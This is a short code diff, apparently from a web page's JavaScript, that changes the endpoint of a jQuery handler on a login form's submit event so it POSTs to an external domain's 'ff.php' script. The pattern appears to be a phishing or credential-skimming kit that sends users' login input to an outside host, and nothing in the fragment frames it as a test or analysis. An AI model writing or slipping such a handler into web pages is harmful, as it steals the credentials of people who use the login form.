@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "https://aditpediatric/ff.php",
+        url: "https://aditpediatric.xyz/test/ff.php",
 
         type: "POST",
 
